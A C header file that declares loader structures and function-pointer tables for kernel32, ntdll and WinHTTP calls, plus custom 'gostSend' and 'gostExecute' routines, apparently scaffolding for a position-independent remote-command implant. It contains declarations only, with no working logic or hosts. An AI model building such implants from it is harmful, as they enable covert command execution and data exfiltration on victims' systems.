#include <winternl.h>
#include <stdio.h>
#include <stdint.h>
#include <winbase.h>
#include <winhttp.h>


//#define WIN_API_FUNC(name, ret_type, ...) ret_type(WINAPI *name)(__VA_ARGS__);
#define WIN_API_FUNC(name, ret_type, ...) ret_type(WINAPI *name)(__VA_ARGS__)

//#define CUSTOM_FUNC(name, ret_type, ...) ret_type(*name)(__VA_ARGS__);
#define CUSTOM_FUNC(name, ret_type, ...) ret_type(*name)(__VA_ARGS__)

#define CUSTOM_ZeroMemory(Destination,Length) custom_memset((Destination),0,(Length))

typedef struct _COFF_HEADER {
    WORD Machine;
    WORD NumberOfSections;
    DWORD TimeDateStamp;
    DWORD PointerToSymbolTable;
    DWORD NumberOfSymbols;
    WORD SizeOfOptionalHeader;
    WORD Characteristics;
} COFF_HEADER, *PCOFF_HEADER;

typedef struct _SECTION_HEADER {
    BYTE Name[8];
    union {
        DWORD PhysicalAddress;
        DWORD VirtualSize;
    } Misc;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD NumberOfRelocations;
    WORD NumberOfLinenumbers;
    DWORD Characteristics;
} SECTION_HEADER, *PSECTION_HEADER;

typedef struct _CUSTOM_LDR_DATA_TABLE_ENTRY {
    PVOID Reserved1[2];
    LIST_ENTRY InMemoryOrderLinks;
    PVOID Reserved2[2];
    PVOID DllBase;
    PVOID Reserved3[2];
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;//BYTE Reserved4[8];
    PVOID Reserved5[3];
    __C89_NAMELESS union {
    ULONG CheckSum;
    PVOID Reserved6;
    };
    ULONG TimeDateStamp;
} CUSTOM_LDR_DATA_TABLE_ENTRY,*PCUSTOM_LDR_DATA_TABLE_ENTRY;

// Forward declarations
typedef struct _FUNCTION_TABLE FUNCTION_TABLE, *PFUNCTION_TABLE;

typedef struct _KERNEL32_TABLE {
    WIN_API_FUNC(LoadLibraryA, HMODULE, LPCSTR lpLibFileName);
    WIN_API_FUNC(GetProcAddress, FARPROC, HMODULE hModule, LPCSTR lpProcName);
    WIN_API_FUNC(WriteConsoleA, BOOL, HANDLE hConsoleOutput, const VOID *lpBuffer, DWORD nNumberOfCharsToWrite, LPDWORD lpNumberOfCharsWritten, LPVOID lpReserved);
    WIN_API_FUNC(ExitProcess, VOID, UINT uExitCode);
    WIN_API_FUNC(GetStdHandle, HANDLE, DWORD nStdHandle);
    WIN_API_FUNC(CreateThread, HANDLE, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
    WIN_API_FUNC(WaitForSingleObject, DWORD, HANDLE hHandle, DWORD dwMilliseconds);
    WIN_API_FUNC(CloseHandle, BOOL, HANDLE hObject);
    WIN_API_FUNC(VirtualAlloc, LPVOID, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
    WIN_API_FUNC(VirtualFree, BOOL, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
    WIN_API_FUNC(VirtualProtect, BOOL, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
    WIN_API_FUNC(GetProcessHeap, HANDLE, VOID);
    WIN_API_FUNC(Sleep, VOID, DWORD dwMilliseconds);
    WIN_API_FUNC(CreateProcessA, BOOL, LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
    WIN_API_FUNC(CreatePipe, BOOL, PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize);
    WIN_API_FUNC(SetHandleInformation, BOOL, HANDLE hObject, DWORD dwMask, DWORD dwFlags);
    WIN_API_FUNC(ReadFile, BOOL, HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
    // WIN_API_FUNC(HeapAlloc, LPVOID, HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
    // WIN_API_FUNC(HeapFree, BOOL, HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
} KERNEL32_TABLE, *PKERNEL32_TABLE;

typedef struct _NTDLL_TABLE {
    // Add NTDLL function pointers here if needed
    WIN_API_FUNC(RtlAllocateHeap, PVOID, PVOID HeapHandle, ULONG Flags, SIZE_T Size);
    WIN_API_FUNC(RtlFreeHeap, BOOLEAN, PVOID HeapHandle, ULONG Flags, PVOID BaseAddress);
} NTDLL_TABLE, *PNTDLL_TABLE;

typedef struct _WINGOST_TABLE {
    // Add WinGost function pointers here if needed
    CUSTOM_FUNC(gostSend, void, char* message, int message_len, const wchar_t* apiID, PFUNCTION_TABLE ft);
    CUSTOM_FUNC(gostPrint, void, char* message, BOOL format, int message_len, PFUNCTION_TABLE ft);
    CUSTOM_FUNC(gostExecute, BOOL, char* command, char* output, DWORD outputSize, PFUNCTION_TABLE ft);

} WINGOST_TABLE, *PWINGOST_TABLE;

typedef struct _WINHTTP_TABLE {
    // Add WinHTTP function pointers here if needed
    WIN_API_FUNC(WinHttpOpen, HINTERNET, LPCWSTR pwszUserAgent, DWORD dwAccessType, LPCWSTR pwszProxyName, LPCWSTR pwszProxyBypass, DWORD dwFlags);
    WIN_API_FUNC(WinHttpConnect, HINTERNET, HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved);
    WIN_API_FUNC(WinHttpOpenRequest, HINTERNET, HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR *ppwszAcceptTypes, DWORD dwFlags);
    WIN_API_FUNC(WinHttpAddRequestHeaders, BOOL, HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers);
    WIN_API_FUNC(WinHttpSendRequest, BOOL, HINTERNET hRequest, LPCWSTR pwszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext);
    WIN_API_FUNC(WinHttpReceiveResponse, BOOL, HINTERNET hRequest, LPVOID lpReserved);
    WIN_API_FUNC(WinHttpQueryDataAvailable, BOOL, HINTERNET hRequest, LPDWORD lpdwNumberOfBytesAvailable);
    WIN_API_FUNC(WinHttpReadData, BOOL, HINTERNET hRequest, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
    WIN_API_FUNC(WinHttpCloseHandle, BOOL, HINTERNET hInternet);
} WINHTTP_TABLE, *PWINHTTP_TABLE;

typedef struct _FUNCTION_TABLE {
    KERNEL32_TABLE Kernel32;
    WINHTTP_TABLE WinHttp;
    NTDLL_TABLE Ntdll;
    WINGOST_TABLE WinGost;
} FUNCTION_TABLE;
